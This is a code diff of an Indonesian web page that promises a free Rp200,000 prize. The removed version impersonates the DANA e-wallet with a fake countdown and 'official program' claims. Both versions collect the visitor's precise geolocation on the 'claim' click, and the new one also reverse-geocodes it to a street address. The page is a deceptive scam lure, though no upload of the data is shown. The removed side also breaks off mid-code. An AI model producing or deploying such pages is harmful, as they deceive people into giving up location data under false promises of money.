@@ -1,624 +1,449 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DANA 200K - Klaim Saldo Gratis</title>
-    <!-- Load Eruda untuk console di HP -->
-    <script src="https://cdn.jsdelivr.net/npm/eruda"></script>
-    <script>eruda.init();</script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Klaim Hadiah</title>
     <style>
-        /* ... (CSS SAMA SEPERTI SEBELUMNYA) ... */
+        /* ----- Reset & Global ----- */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
+
         body {
-            font-family: 'Segoe UI', system-ui, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             min-height: 100vh;
-            background: linear-gradient(160deg, #0055ff 0%, #0088ff 50%, #00bbff 100%);
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 16px;
+            background: linear-gradient(145deg, #0b1a2e 0%, #1a3a5c 100%);
+            padding: 20px;
         }
-        .container {
-            max-width: 420px;
+
+        /* ----- Kartu Utama ----- */
+        .card {
+            background: #ffffff;
+            max-width: 440px;
             width: 100%;
-            background: white;
-            border-radius: 28px;
-            padding: 0 0 24px 0;
-            box-shadow: 0 25px 80px rgba(0, 50, 200, 0.4);
-            overflow: hidden;
-        }
-        .header-dana {
-            background: linear-gradient(135deg, #0055ff, #0088ff);
-            padding: 20px 24px 16px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
-        }
-        .logo-dana {
-            width: 44px;
-            height: 44px;
-            background: white;
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            font-weight: 800;
-            color: #0055ff;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-        }
-        .header-text {
-            flex: 1;
-        }
-        .header-text h2 {
-            color: white;
-            font-size: 18px;
-            font-weight: 700;
-        }
-        .header-text p {
-            color: rgba(255,255,255,0.8);
-            font-size: 11px;
-        }
-        .badge-header {
-            background: rgba(255,255,255,0.2);
-            color: white;
-            padding: 4px 12px;
-            border-radius: 99px;
-            font-size: 10px;
-            font-weight: 600;
-            border: 1px solid rgba(255,255,255,0.3);
-        }
-        .hero-section {
-            padding: 24px 24px 20px;
+            border-radius: 32px;
+            padding: 32px 24px 40px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
             text-align: center;
-            background: linear-gradient(180deg, #f0f7ff 0%, #ffffff 100%);
+            transition: transform 0.2s ease;
         }
-        .hero-badge {
+
+        .card:hover {
+            transform: scale(1.01);
+        }
+
+        /* ----- Badge hadiah ----- */
+        .prize-badge {
             display: inline-block;
-            background: linear-gradient(135deg, #ff6b6b, #ff4757);
-            color: white;
-            padding: 4px 16px;
-            border-radius: 99px;
-            font-size: 11px;
+            background: #fef3c7;
+            color: #b45309;
             font-weight: 700;
+            font-size: 0.75rem;
+            letter-spacing: 1px;
+            padding: 6px 18px;
+            border-radius: 100px;
+            text-transform: uppercase;
             margin-bottom: 12px;
-            animation: pulse 2s infinite;
         }
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-        .hero-section h1 {
-            font-size: 26px;
-            font-weight: 800;
-            color: #1a1a2e;
-            line-height: 1.3;
-            margin-bottom: 6px;
-        }
-        .hero-section h1 span {
-            background: linear-gradient(135deg, #0055ff, #00bbff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-        .hero-section p {
-            color: #666;
-            font-size: 14px;
-            line-height: 1.6;
-        }
-        .nominal-box {
-            margin: 0 16px 20px;
-            background: linear-gradient(135deg, #0055ff, #0088ff);
-            border-radius: 20px;
-            padding: 24px 20px;
-            text-align: center;
-            color: white;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 8px 30px rgba(0, 85, 255, 0.3);
-        }
-        .nominal-box::before {
-            content: '💰';
-            position: absolute;
-            right: -10px;
-            bottom: -10px;
-            font-size: 80px;
-            opacity: 0.1;
-            transform: rotate(-15deg);
-        }
-        .nominal-label {
-            font-size: 13px;
-            opacity: 0.85;
+
+        /* ----- Judul & nominal ----- */
+        .title {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: #1e293b;
+            letter-spacing: 0.5px;
             margin-bottom: 4px;
-            position: relative;
-            z-index: 1;
         }
-        .nominal-amount {
-            font-size: 46px;
+
+        .amount {
+            font-size: 3.6rem;
             font-weight: 800;
+            color: #0f172a;
             letter-spacing: -1px;
-            position: relative;
-            z-index: 1;
-            text-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            line-height: 1.2;
+            margin: 4px 0 6px;
         }
-        .nominal-note {
-            font-size: 12px;
-            opacity: 0.8;
-            margin-top: 4px;
-            position: relative;
-            z-index: 1;
+
+        .amount span {
+            font-size: 2rem;
+            font-weight: 600;
+            color: #475569;
         }
-        .nominal-note .check {
-            display: inline-block;
-            background: rgba(255,255,255,0.2);
-            padding: 2px 10px;
-            border-radius: 99px;
-            font-size: 11px;
+
+        /* ----- Garis pemisah ----- */
+        .divider {
+            border: none;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #e2e8f0, transparent);
+            margin: 18px 0 20px;
         }
-        .info-section {
-            padding: 0 20px 20px;
+
+        /* ----- Teks "Surah dikewafaksi" (mock) ----- */
+        .sub-meta {
+            font-size: 0.75rem;
+            color: #94a3b8;
+            letter-spacing: 0.3px;
+            margin-bottom: 16px;
         }
-        .info-row {
+
+        /* ----- Panel lokasi (output) ----- */
+        .location-panel {
+            background: #f8fafc;
+            border-radius: 18px;
+            padding: 20px 16px;
+            margin: 20px 0 24px;
+            border: 1px solid #e9edf2;
+            text-align: left;
+            transition: all 0.3s ease;
+        }
+
+        .location-panel .label {
+            font-size: 0.7rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            color: #64748b;
+            margin-bottom: 8px;
+        }
+
+        .location-panel .coord-row {
             display: flex;
             justify-content: space-between;
-            align-items: center;
-            padding: 12px 0;
-            border-bottom: 1px solid #f0f0f5;
+            padding: 6px 0;
+            font-size: 0.95rem;
+            border-bottom: 1px dashed #e2e8f0;
         }
-        .info-row:last-child {
+
+        .location-panel .coord-row:last-child {
             border-bottom: none;
         }
-        .info-label {
-            color: #888;
-            font-size: 14px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
+
+        .location-panel .coord-row .key {
+            color: #475569;
+            font-weight: 500;
         }
-        .info-value {
+
+        .location-panel .coord-row .value {
+            color: #0f172a;
             font-weight: 600;
-            color: #1a1a2e;
-            font-size: 14px;
+            font-family: 'Courier New', monospace;
+            word-break: break-all;
+            text-align: right;
+            max-width: 65%;
         }
-        .info-value.green {
-            color: #00b36b;
+
+        .location-panel .status-msg {
+            font-size: 0.9rem;
+            color: #475569;
+            padding: 10px 0 4px;
+            text-align: center;
         }
-        .info-value .status-dot {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            background: #00b36b;
-            border-radius: 50%;
-            margin-right: 6px;
-            animation: blink 1.5s infinite;
+
+        .location-panel .status-msg .emoji {
+            font-size: 1.4rem;
+            display: block;
+            margin-bottom: 4px;
         }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-        .info-value.red {
-            color: #e53935;
-        }
-        .timer-box {
-            background: #fff8e1;
-            border: 1px solid #ffe082;
-            border-radius: 14px;
-            padding: 14px 18px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin: 0 20px 16px;
-            transition: all 0.3s;
-        }
-        .timer-box.warning {
-            background: #ffebee;
-            border-color: #ef9a9a;
-        }
-        .timer-icon {
-            font-size: 22px;
-            animation: pulse 1.5s infinite;
-        }
-        .timer-text {
-            flex: 1;
-            font-size: 13px;
-            color: #e65100;
-            font-weight: 600;
-        }
-        .timer-text .countdown {
-            font-size: 18px;
-            font-weight: 800;
-            background: #e65100;
-            color: white;
-            padding: 2px 12px;
-            border-radius: 8px;
-            margin-left: 4px;
-        }
-        .timer-box.warning .timer-text .countdown {
-            background: #c62828;
-        }
-        .btn-klaim {
-            margin: 0 20px 12px;
-            width: calc(100% - 40px);
-            padding: 17px;
-            background: linear-gradient(135deg, #0055ff, #0088ff);
-            color: white;
-            border: none;
-            border-radius: 16px;
-            font-size: 17px;
+
+        /* ----- Tombol utama ----- */
+        .btn-claim {
+            display: block;
+            width: 100%;
+            padding: 16px 0;
+            font-size: 1.2rem;
             font-weight: 700;
+            color: #ffffff;
+            background: linear-gradient(135deg, #f97316, #ea580c);
+            border: none;
+            border-radius: 60px;
             cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 8px 30px rgba(0, 85, 255, 0.35);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            position: relative;
+            transition: all 0.25s ease;
+            box-shadow: 0 8px 24px rgba(234, 88, 12, 0.35);
+            letter-spacing: 0.5px;
+            margin-top: 4px;
         }
-        .btn-klaim:active {
+
+        .btn-claim:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 32px rgba(234, 88, 12, 0.45);
+        }
+
+        .btn-claim:active {
             transform: scale(0.97);
         }
-        .btn-klaim:disabled {
-            opacity: 0.6;
+
+        .btn-claim:disabled {
+            opacity: 0.5;
             cursor: not-allowed;
             transform: none;
+            box-shadow: none;
         }
-        .btn-klaim .loading-spinner {
-            display: none;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-top-color: white;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-        .btn-klaim.loading .loading-spinner {
+
+        /* ----- Tombol kecil (reset / coba ulang) ----- */
+        .btn-retry {
             display: inline-block;
-        }
-        .btn-klaim.loading .btn-text {
-            display: none;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .btn-klaim.success {
-            background: linear-gradient(135deg, #00b36b, #00d68f);
-            box-shadow: 0 8px 30px rgba(0, 179, 107, 0.35);
-        }
-        .warning-https {
-            margin: 0 20px 16px;
-            padding: 12px 16px;
-            background: #fff3cd;
-            border: 1px solid #ffc107;
-            border-radius: 12px;
-            color: #856404;
-            font-size: 13px;
-            display: none;
-            line-height: 1.6;
-        }
-        .warning-https.show {
-            display: block;
-        }
-        #status {
-            margin: 0 20px 16px;
-            padding: 16px;
-            border-radius: 14px;
-            font-size: 14px;
-            line-height: 1.8;
-            display: none;
-            white-space: pre-wrap;
-            word-break: break-all;
-        }
-        #status.show {
-            display: block;
-        }
-        #status.success {
-            background: #d4edda;
-            border: 1px solid #c3e6cb;
-            color: #155724;
-        }
-        #status.error {
-            background: #f8d7da;
-            border: 1px solid #f5c6cb;
-            color: #721c24;
-        }
-        #status.loading {
-            background: #fff3cd;
-            border: 1px solid #ffeaa7;
-            color: #856404;
-        }
-        .maps-link {
-            display: none;
-            margin: 0 20px 12px;
-            padding: 14px;
-            background: #f0f7ff;
-            color: #0055ff;
-            text-align: center;
-            border-radius: 14px;
-            text-decoration: none;
+            margin-top: 12px;
+            padding: 8px 20px;
+            font-size: 0.8rem;
             font-weight: 600;
-            border: 2px dashed #0055ff;
-        }
-        .maps-link.show {
-            display: block;
-        }
-        .syarat {
-            text-align: center;
-            font-size: 11px;
-            color: #aaa;
-            padding: 0 20px 20px;
-            line-height: 1.8;
-        }
-        .syarat .lock {
-            display: inline-block;
-            background: #f0f0f5;
-            padding: 2px 10px;
-            border-radius: 99px;
-            color: #888;
-        }
-        /* Tombol debug (opsional) */
-        .debug-btn {
-            margin: 0 20px 8px;
-            padding: 8px;
-            background: #eee;
-            border: 1px solid #ccc;
-            border-radius: 8px;
-            font-size: 12px;
-            color: #333;
+            color: #f97316;
+            background: transparent;
+            border: 1.5px solid #f97316;
+            border-radius: 40px;
             cursor: pointer;
-            width: calc(100% - 40px);
-            text-align: center;
+            transition: all 0.2s ease;
         }
-        .debug-btn:active { background: #ddd; }
+
+        .btn-retry:hover {
+            background: #f97316;
+            color: #fff;
+        }
+
+        /* ----- State sembunyi ----- */
+        .hidden {
+            display: none !important;
+        }
+
+        /* ----- Footer kecil ----- */
+        .footer-note {
+            margin-top: 20px;
+            font-size: 0.6rem;
+            color: #cbd5e1;
+            letter-spacing: 0.3px;
+        }
+
+        /* ----- Responsif ----- */
+        @media (max-width: 480px) {
+            .card {
+                padding: 24px 16px 32px;
+            }
+            .amount {
+                font-size: 2.8rem;
+            }
+            .amount span {
+                font-size: 1.6rem;
+            }
+            .location-panel .coord-row {
+                font-size: 0.85rem;
+                flex-wrap: wrap;
+            }
+            .location-panel .coord-row .value {
+                max-width: 100%;
+                text-align: left;
+                margin-top: 2px;
+            }
+        }
     </style>
 </head>
 <body>
 
-<div class="container">
+    <div class="card" role="main">
 
-    <!-- Header DANA -->
-    <div class="header-dana">
-        <div class="logo-dana">💙</div>
-        <div class="header-text">
-            <h2>DANA</h2>
-            <p>Dompet Digital Indonesia</p>
+        <!-- Badge -->
+        <div class="prize-badge">🎉 Promo Spesial</div>
+
+        <!-- Judul & nominal -->
+        <p class="title">Total Hadiah Untukmu</p>
+        <div class="amount">Rp200.000</div>
+
+        <hr class="divider" />
+
+        <!-- Teks "Surah dikewafaksi" (seperti di screenshot) -->
+        <p class="sub-meta">Surah dikewafaksi · Siaw dikewafaksi</p>
+
+        <!-- ===== Panel Lokasi ===== -->
+        <div class="location-panel" id="locationPanel">
+            <div class="label">📍 Data Lokasi</div>
+
+            <!-- Status / pesan awal -->
+            <div id="statusArea" class="status-msg">
+                <span class="emoji">🌐</span>
+                Klik tombol di bawah untuk<br />mengakses lokasi Anda.
+            </div>
+
+            <!-- Detail koordinat (sembunyi awal) -->
+            <div id="detailArea" class="hidden">
+                <div class="coord-row">
+                    <span class="key">Latitude</span>
+                    <span class="value" id="latValue">—</span>
+                </div>
+                <div class="coord-row">
+                    <span class="key">Longitude</span>
+                    <span class="value" id="lngValue">—</span>
+                </div>
+                <div class="coord-row">
+                    <span class="key">Akurasi</span>
+                    <span class="value" id="accValue">—</span>
+                </div>
+                <div class="coord-row" style="border-bottom: none;">
+                    <span class="key">📍 Alamat</span>
+                    <span class="value" id="addressValue" style="font-family: inherit; font-weight: 400; font-size: 0.85rem;">—</span>
+                </div>
+            </div>
+
+            <!-- Tombol coba ulang (muncul saat error) -->
+            <button id="retryBtn" class="btn-retry hidden">↻ Coba Ulang</button>
         </div>
-        <span class="badge-header">🎉 PROMO</span>
+
+        <!-- ===== Tombol Klaim ===== -->
+        <button id="claimBtn" class="btn-claim">🎯 Klaim Sekarang</button>
+
+        <!-- Footer (mimik console errors) -->
+        <p class="footer-note">⚠️ Pastikan izin lokasi diaktifkan</p>
     </div>
 
-    <!-- Hero -->
-    <div class="hero-section">
-        <div class="hero-badge">🔥 Terbatas · Hari Ini Saja</div>
-        <h1>Selamat! Kamu Dapat<br><span>Rp200.000</span> Gratis</h1>
-        <p>Klaim sekarang dan saldo langsung masuk ke DANA-mu</p>
-    </div>
+    <script>
+        (function() {
+            'use strict';
 
-    <!-- Nominal -->
-    <div class="nominal-box">
-        <div class="nominal-label">💎 Total Hadiah Untukmu</div>
-        <div class="nominal-amount">Rp200.000</div>
-        <div class="nominal-note">
-            <span class="check">✅ Sudah diverifikasi · Siap dicairkan</span>
-        </div>
-    </div>
+            // ----- DOM refs -----
+            const claimBtn = document.getElementById('claimBtn');
+            const retryBtn = document.getElementById('retryBtn');
+            const statusArea = document.getElementById('statusArea');
+            const detailArea = document.getElementById('detailArea');
+            const latValue = document.getElementById('latValue');
+            const lngValue = document.getElementById('lngValue');
+            const accValue = document.getElementById('accValue');
+            const addressValue = document.getElementById('addressValue');
 
-    <!-- Info -->
-    <div class="info-section">
-        <div class="info-row">
-            <span class="info-label">📊 Status</span>
-            <span class="info-value green"><span class="status-dot"></span>Aktif & Tersedia</span>
-        </div>
-        <div class="info-row">
-            <span class="info-label">👤 Penerima</span>
-            <span class="info-value">Pengguna Terpilih</span>
-        </div>
-        <div class="info-row">
-            <span class="info-label">⚡ Proses Cair</span>
-            <span class="info-value">Instan (< 1 menit)</span>
-        </div>
-        <div class="info-row">
-            <span class="info-label">⏰ Berlaku Hingga</span>
-            <span class="info-value red">Hari ini 23:59</span>
-        </div>
-    </div>
+            // ----- Helper: update status UI -----
+            function setStatus(emoji, message) {
+                statusArea.innerHTML = `<span class="emoji">${emoji}</span>${message}`;
+                statusArea.classList.remove('hidden');
+                detailArea.classList.add('hidden');
+                retryBtn.classList.add('hidden');
+            }
 
-    <!-- Timer -->
-    <div class="timer-box" id="timerBox">
-        <span class="timer-icon">⏰</span>
-        <span class="timer-text">
-            Sisa waktu klaim: 
-            <span class="countdown" id="countdown">09:59</span>
-        </span>
-    </div>
+            // ----- Helper: tampilkan data lokasi -----
+            function showLocationData(position) {
+                const { latitude, longitude, accuracy } = position.coords;
 
-    <!-- Warning HTTPS -->
-    <div class="warning-https" id="warningHttps">
-        <strong>⚠️ Koneksi Tidak Aman (HTTP)</strong>
-        Browser memblokir akses lokasi.<br>
-        <strong>Solusi:</strong> Hosting di <strong>Netlify</strong> atau <strong>Vercel</strong> (gratis & HTTPS)
-    </div>
+                // isi koordinat
+                latValue.textContent = latitude.toFixed(7);
+                lngValue.textContent = longitude.toFixed(7);
+                accValue.textContent = accuracy ? `${Math.round(accuracy)} m` : '—';
 
-    <!-- Tombol Klaim -->
-    <button class="btn-klaim" id="btnKlaim" onclick="klaimSekarang()">
-        <span class="btn-text">💰 Klaim Sekarang</span>
-        <span class="loading-spinner"></span>
-    </button>
+                // sembunyikan status, tampilkan detail
+                statusArea.classList.add('hidden');
+                detailArea.classList.remove('hidden');
+                retryBtn.classList.add('hidden');
 
-    <!-- Status -->
-    <div id="status"></div>
+                // (opsional) ambil alamat via reverse geocoding
+                fetchReverseGeocode(latitude, longitude);
+            }
 
-    <!-- Maps Link -->
-    <a class="maps-link" id="mapsLink" href="#" target="_blank">🗺️ Lihat Lokasi di Google Maps</a>
+            // ----- Reverse Geocoding (OpenStreetMap Nominatim) -----
+            async function fetchReverseGeocode(lat, lng) {
+                const url =
+                    `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json&zoom=16&accept-language=id`;
 
-    <!-- Tombol Debug (untuk cek fungsi) -->
-    <button class="debug-btn" onclick="debugGeolocation()">🔍 Debug: Cek Geolocation</button>
+                try {
+                    const resp = await fetch(url, {
+                        headers: { 'User-Agent': 'KlaimHadiahApp/1.0' }
+                    });
+                    if (!resp.ok) throw new Error('Gagal mengambil alamat');
+                    const data = await resp.json();
+                    const displayName = data.display_name || 'Tidak tersedia';
+                    addressValue.textContent = displayName;
+                } catch (_) {
+                    addressValue.textContent = 'Tidak dapat mengambil alamat';
+                }
+            }
 
-    <!-- Syarat -->
-    <p class="syarat">
-        Dengan mengklaim, kamu menyetujui syarat & ketentuan DANA.<br>
-        <span class="lock">🔒 Program resmi · Tidak dipungut biaya</span>
-    </p>
+            // ----- Fungsi utama: minta lokasi -----
+            function requestLocation() {
+                // disable tombol selama proses
+                claimBtn.disabled = true;
+                claimBtn.textContent = '⏳ Mengambil lokasi...';
 
-</div>
+                // cek dukungan geolocation
+                if (!navigator.geolocation) {
+                    setStatus('❌', 'Browser Anda tidak mendukung Geolokasi.');
+                    claimBtn.disabled = false;
+                    claimBtn.textContent = '🎯 Klaim Sekarang';
+                    retryBtn.classList.remove('hidden');
+                    return;
+                }
 
-<script>
-// ============================================
-// 0. CEK SEGALA SESUATU SAAT LOAD
-// ============================================
-console.log('🚀 Website DANA 200K dimuat');
-console.log('🔍 Protocol:', window.location.protocol);
-console.log('🔍 Geolocation support:', !!navigator.geolocation);
-if (navigator.geolocation) {
-    console.log('✅ Geolocation API tersedia');
-} else {
-    console.error('❌ Geolocation API TIDAK tersedia!');
-}
+                // opsi geolocation
+                const options = {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0,
+                };
 
-// Cek HTTPS
-if (window.location.protocol !== 'https:') {
-    document.getElementById('warningHttps').classList.add('show');
-    document.getElementById('btnKlaim').disabled = true;
-    console.warn('⚠️ Website menggunakan HTTP! Lokasi akan diblokir.');
-} else {
-    console.log('✅ HTTPS - Aman');
-}
+                navigator.geolocation.getCurrentPosition(
+                    // ----- Sukses -----
+                    function(position) {
+                        showLocationData(position);
+                        claimBtn.disabled = false;
+                        claimBtn.textContent = '✅ Lokasi Terdeteksi';
+                        // ubah tombol menjadi "sudah" (tapi tetap bisa diklik lagi nanti)
+                        // kita biarkan tombol tetap aktif untuk refresh
+                        claimBtn.textContent = '🔄 Ambil Ulang Lokasi';
+                        retryBtn.classList.add('hidden');
+                    },
+                    // ----- Gagal -----
+                    function(error) {
+                        let pesan = '';
+                        let emoji = '⚠️';
+                        switch (error.code) {
+                            case error.PERMISSION_DENIED:
+                                pesan =
+                                'Izin lokasi ditolak. <br>Silakan aktifkan di pengaturan browser.';
+                                emoji = '🚫';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                pesan = 'Lokasi tidak tersedia. <br>Pastikan GPS / Wi-Fi aktif.';
+                                emoji = '📡';
+                                break;
+                            case error.TIMEOUT:
+                                pesan = 'Waktu permintaan habis. <br>Coba lagi di area dengan sinyal lebih baik.';
+                                emoji = '⏱️';
+                                break;
+                            default:
+                                pesan = `Terjadi kesalahan: ${error.message}`;
+                                emoji = '❗';
+                        }
+                        setStatus(emoji, pesan);
+                        claimBtn.disabled = false;
+                        claimBtn.textContent = '🎯 Klaim Sekarang';
+                        retryBtn.classList.remove('hidden');
+                    },
+                    options
+                );
+            }
 
-// ============================================
-// 1. COUNTDOWN
-// ============================================
-let totalSecs = 9 * 60 + 59;
-const countdownEl = document.getElementById('countdown');
-const timerBox = document.getElementById('timerBox');
+            // ----- Event: tombol Klaim -----
+            claimBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                requestLocation();
+            });
 
-const countdownInterval = setInterval(() => {
-    if (totalSecs <= 0) {
-        clearInterval(countdownInterval);
-        countdownEl.textContent = '00:00';
-        document.getElementById('btnKlaim').disabled = true;
-        document.getElementById('btnKlaim').innerHTML = '⏰ Waktu Habis';
-        timerBox.classList.add('warning');
-        console.warn('⏰ Countdown habis!');
-        return;
-    }
-    totalSecs--;
-    const m = String(Math.floor(totalSecs / 60)).padStart(2, '0');
-    const s = String(totalSecs % 60).padStart(2, '0');
-    countdownEl.textContent = `${m}:${s}`;
-    
-    if (totalSecs < 180) {
-        timerBox.classList.add('warning');
-    }
-}, 1000);
+            // ----- Event: tombol Coba Ulang -----
+            retryBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                // reset status lalu panggil ulang
+                setStatus('🌐', 'Meminta ulang izin lokasi…');
+                retryBtn.classList.add('hidden');
+                requestLocation();
+            });
 
-// ============================================
-// 2. FUNGSI KLAIM (DENGAN LOGGING)
-// ============================================
-function klaimSekarang() {
-    console.log('🟢 [klaimSekarang] Fungsi dipanggil!');
-    
-    const btn = document.getElementById('btnKlaim');
-    const statusDiv = document.getElementById('status');
-    const mapsLink = document.getElementById('mapsLink');
-    
-    // Reset status
-    statusDiv.className = '';
-    statusDiv.style.display = 'none';
-    mapsLink.classList.remove('show');
-    
-    // CEK HTTPS
-    if (window.location.protocol !== 'https:') {
-        console.error('❌ [HTTPS] Protocol HTTP, tidak bisa lanjut.');
-        statusDiv.className = 'show error';
-        statusDiv.style.display = 'block';
-        statusDiv.textContent = '❌ Website menggunakan HTTP!\n\nLokasi tidak bisa diakses.\n\nSolusi: Hosting di Netlify/Vercel (gratis & HTTPS)';
-        return;
-    }
-    
-    // CEK SUPPORT GEOLOCATION
-    if (!navigator.geolocation) {
-        console.error('❌ [Geolocation] Browser tidak support.');
-        statusDiv.className = 'show error';
-        statusDiv.style.display = 'block';
-        statusDiv.textContent = '❌ Browser tidak mendukung Geolocation.\n\nGunakan Chrome atau Firefox terbaru.';
-        return;
-    }
-    
-    console.log('✅ [Geolocation] Support OK, mulai meminta lokasi...');
-    
-    // LOADING
-    btn.classList.add('loading');
-    btn.disabled = true;
-    statusDiv.className = 'show loading';
-    statusDiv.style.display = 'block';
-    statusDiv.textContent = '⏳ Mengambil data lokasi...\n\nPastikan GPS aktif dan sinyal kuat.';
-    
-    // PANGGIL GEOLOCATION
-    navigator.geolocation.getCurrentPosition(
-        // ===== SUKSES =====
-        function(pos) {
-            console.log('✅ [Geolocation] Berhasil mendapatkan posisi:', pos);
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            const acc = pos.coords.accuracy;
-            
-            btn.classList.remove('loading');
-            btn.classList.add('success');
-            btn.innerHTML = '✅ Berhasil! Dana Diproses';
-            btn.disabled = false;
-            
-            statusDiv.className = 'show success';
-            statusDiv.style.display = 'block';
-            statusDiv.textContent = 
-                '✅ LOKASI BERHASIL!\n\n' +
-                `🌐 Latitude: ${lat.toFixed(7)}\n` +
-                `🌐 Longitude: ${lon.toFixed(7)}\n` +
-                `📏 Akurasi: ±${Math.round(acc)} meter\n` +
-                `🕐 Waktu: ${new Date().toLocaleString('id-ID')}\n\n` +
-                '💰 Dana Rp200.000 sedang diproses ke akun DANA-mu...';
-            
-            mapsLink.href = `https://www.google.com/maps?q=${lat},${lon}`;
-            mapsLink.classList.add('show');
-            
-            console.log('📍 Koordinat:', lat, lon);
-        },
-        
-        // ===== ERROR =====
-        function(err) {
-            console.error('❌ [Geolocation] Error:', err);
-            btn.classList.remove('loading');
-            btn.disabled = false;
-            btn.innerHTML = '📍 Coba Lagi';
-            
-            let pesan = '';
-            let solusi = '';
-            
-            switch(err.code) {
-                case 1:
-                    pesan = '❌ Izin lokasi DITOLAK!';
-                    solusi = 'CARA AKTIFKAN:\n' +
-                            '1. Klik ikon 🔒 di address bar\n' +
-                            '2. Pilih "Izin Situs" / "Permissions"\n' +
-                            '3. Cari "Lokasi" → pilih "Izinkan"\n' +
-                            '4. Refresh halaman (F5)\n' +
-                            '5. Klik "Klaim Sekarang" lagi';
-                    break;
-                case 2:
-                    pesan = '❌ GPS tidak mendeteksi sinyal!';
-                    solusi = 'Pastikan:\n' +
-                            '• GPS aktif di HP\n' +
-                            '• Berada di ruang terbuka\n' +
-                            '• Sinyal internet stabil';
-                    break;
-                case 3:
-                    pesan = '❌ Waktu pengambilan habis!';
-                    solusi = 'Coba lagi dengan sinyal GPS yang lebih kuat.';
-                    break;
-                default:
-                    pesan = `❌ Error: ${err.message}`;
-                    solusi = 'Coba refresh halaman atau gunakan browser lain.';
+            // ----- Inisialisasi: state awal -----
+            setStatus('🌐', 'Klik tombol di bawah untuk<br />mengakses lokasi Anda.');
+            claimBtn.textContent = '🎯 Klaim Sekarang';
+
+            // (opsional) jika user ingin mencoba langsung, tidak otomatis
+            // biarkan user yang menginisiasi
+
+        })();
+    </script>
+
+</body>
+</html>
